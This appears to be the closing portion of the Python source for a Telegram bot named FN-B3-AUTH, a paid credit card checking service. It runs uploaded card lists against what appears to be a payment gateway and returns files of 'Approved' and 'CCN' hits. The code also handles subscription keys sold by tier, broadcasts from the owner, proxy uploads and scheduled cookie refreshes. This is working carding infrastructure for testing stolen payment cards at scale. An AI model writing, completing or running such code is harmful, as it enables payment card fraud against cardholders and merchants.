[∑] 𝗧𝗼𝘁𝗮𝗹: {progress['total']}
━━━━━━━━━━━━━━━━━━━━━━
[⏱️] 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {total_time:.2f} seconds
[⚡] 𝗔𝘃𝗴 𝗦𝗽𝗲𝗲𝗱: {avg_speed:.2f} cards/sec
[📈] 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗥𝗮𝘁𝗲: {success_rate:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
[👨‍💻] **Dev**: <a href='tg://user?id=7593550190'>FN x Electra</a>"""
    )
    await update.message.reply_text(summary, parse_mode="HTML")
    logger.info("File checking completed")
    hits = [r for r in progress["results"] if r["status"] in ["𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅", "𝐂𝐂𝐍 ✅"]]
    if hits:
        hits_file = f"fn-b3-hits-{random.randint(1000, 9999)}.txt"
        with open(hits_file, "w") as f:
            for hit in hits:
                f.write(f"{hit['card']} - {hit['status']} - {hit['result']['original_message']}\n")
        await update.message.reply_document(
            document=open(hits_file, "rb"),
            filename=hits_file,
            caption="🎉 **Your Hits File is Ready! Download Now.**"
        )
        logger.info("Hits file sent")
        os.remove(hits_file)
    progress_collection.delete_one({"user_id": user_id})

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Only the owner can generate keys.")
        logger.error(f"Unauthorized /genkey by user {user_id}")
        return
    args = context.args
    if len(args) != 3 or args[0] not in CHECKING_LIMITS or not args[1].endswith("d") or not args[2].isdigit():
        await update.message.reply_text("Usage: /genkey <tier> <duration>d <quantity>\nExample: /genkey Gold 7d 5")
        logger.error("Invalid /genkey args")
        return
    tier = args[0]
    duration = int(args[1][:-1])
    quantity = int(args[2])
    keys = []
    for _ in range(quantity):
        key = f"FN-B3-{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}"
        keys_collection.insert_one({"key": key, "tier": tier, "duration_days": duration, "used": False})
        keys.append(key)
    response = (
        f"🎁 𝗚𝗶𝗳𝘁 𝗞𝗲𝘆 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 🎉\n\n"
        f"🔢 𝗤𝘂𝗮𝗻𝘁𝗶𝘁𝘆: {quantity}\n"
        f"📋 𝗗𝗲𝘁𝗮𝗶𝗹𝘀:\n" +
        "\n".join([f"🔑 `{key}`\n  └─ 💎 𝗧𝗶𝗲𝗿: {tier} | ⏳ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {duration} days" for key in keys]) +
        f"\n\n📌 𝗧𝗼 𝗥𝗲𝗱𝗲𝗲𝗺: Use `/redeem <key>`"
    )
    await update.message.reply_text(response, parse_mode="Markdown")
    logger.info(f"Generated {quantity} keys for tier {tier}")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) != 1:
        await update.message.reply_text("Usage: /redeem <key>")
        logger.error("Invalid /redeem args")
        return
    key = args[0]
    key_data = keys_collection.find_one({"key": key, "used": False})
    if not key_data:
        await update.message.reply_text("❌ Invalid or used key.")
        logger.error(f"Invalid key: {key}")
        return
    user_id = update.effective_user.id
    expiration = datetime.utcnow() + timedelta(days=key_data["duration_days"])
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"tier": key_data["tier"], "expiration": expiration}},
        upsert=True
    )
    keys_collection.update_one({"key": key}, {"$set": {"used": True}})
    await update.message.reply_text(
        f"""🎉 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗔𝗰𝘁𝗶𝘃𝗮𝘁𝗲𝗱!

💎 𝗧𝗶𝗲𝗿: {key_data['tier']}
⏳ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {key_data['duration_days']} days
📅 𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗢𝗻: {expiration.strftime('%Y-%m-%d %H:%M:%S')} UTC

𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝗨𝘀𝗶𝗻𝗴 𝗙𝗡-𝗕3-𝗔𝗨𝗧𝗛 🚀"""
    )
    logger.info(f"Key {key} redeemed by user {user_id}")

async def delkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Only the owner can delete subscriptions.")
        logger.error(f"Unauthorized /delkey by user {user_id}")
        return
    args = context.args
    if len(args) != 1 or not args[0].isdigit():
        await update.message.reply_text("Usage: /delkey <user_id>")
        logger.error("Invalid /delkey args")
        return
    target_user_id = int(args[0])
    result = users_collection.delete_one({"user_id": target_user_id})
    if result.deleted_count:
        await update.message.reply_text(f"Subscription deleted for user {target_user_id}.")
        logger.info(f"Subscription deleted for user {target_user_id}")
    else:
        await update.message.reply_text(f"No subscription found for user {target_user_id}.")
        logger.info(f"No subscription found for user {target_user_id}")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    progress_collection.update_one({"user_id": user_id}, {"$set": {"stopped": True}})
    await update.message.reply_text("❌ Checking stopped.")
    logger.info("Stop command executed")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Only the owner can broadcast.")
        logger.error(f"Unauthorized /broadcast by user {user_id}")
        return
    message = " ".join(context.args)
    if not message:
        await update.message.reply_text("Please provide a message to broadcast.")
        logger.error("No broadcast message")
        return
    users = users_collection.find()
    sent_count = 0
    for user in users:
        try:
            await context.bot.send_message(chat_id=user["user_id"], text=message, parse_mode="HTML")
            sent_count += 1
        except:
            continue
    await update.message.reply_text(f"📢 Broadcast sent to {sent_count} users.")
    logger.info(f"Broadcast sent to {sent_count} users")

def main():
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("chk", chk))
        application.add_handler(CommandHandler("genkey", genkey))
        application.add_handler(CommandHandler("redeem", redeem))
        application.add_handler(CommandHandler("delkey", delkey))
        application.add_handler(CommandHandler("stop", stop))
        application.add_handler(CommandHandler("broadcast", broadcast))
        application.add_handler(CommandHandler("updatecookies", update_cookies))
        application.add_handler(CommandHandler("addproxies", add_proxies))
        application.add_handler(MessageHandler(filters.Document.ALL, lambda u, c: handle_proxies_file(u, c) if c.user_data.get("awaiting_proxies", False) else handle_file(u, c)))
        application.add_handler(CallbackQueryHandler(button_callback))
        if application.job_queue is None:
            logger.error("JobQueue not available. Install python-telegram-bot[job-queue]")
            raise RuntimeError("JobQueue not available")
        application.job_queue.run_repeating(schedule_cookie_refresh, interval=COOKIE_REFRESH_INTERVAL, first=0)
        application.run_polling()
    except Exception as e:
        logger.error(f"Bot startup failed: {e}")
        raise

if __name__ == "__main__":
    main()